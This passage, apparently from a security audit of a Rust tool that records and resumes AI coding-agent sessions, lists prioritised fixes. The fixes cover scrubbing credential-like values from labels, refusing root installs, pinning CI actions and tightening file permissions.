3. **M-3** `src/record.rs:425`, `src/agents/claude.rs:364-389`, `codex.rs:311-312`, `opencode.rs:106`: stop storing inline JSON flag values, credential-looking `-c` values, URL userinfo and non-path `OPENCODE_DB` values in the label.
4. **M-4** `src/cli.rs:328,354`: refuse to run `install` and `uninstall` as root and remove the `is_root` paths (`src/platform/macos.rs:1127-1152,1254-1258`); switch `Config::save` (`src/config.rs:85-88`) to `edits::write_atomic`.
5. **M-5** `src/wake.rs:469-476` and each `resume_plan`: re-scrub `rec.env` at wake, validate the session id shape in every adapter, check that `rec.bin` is the agent's program and not writable by others, constrain Pi's `session_file`.
6. **L-8** `.github/workflows/release.yml:19,63,65,108,120,122`: pin actions to commit SHAs and add build provenance attestation before the first public tag.
7. **Section 4, item 2** `assets/launchd/daemon.plist:10-11`: remove `StandardOutPath` and `StandardErrorPath` from the daemon plist (log from the process itself), or prove on a test Mac that launchd opens them as the user.
8. **README warnings** from section 5.

Should fix soon after (cheap): L-6 (0700 state and config dirs, 0600 log and backups), L-7 (user from the passwd entry, show and hash the staged plist), L-9 (`mktemp` staging, absolute path in uninstall.sh), L-10 (strip control characters), I-13, I-14.
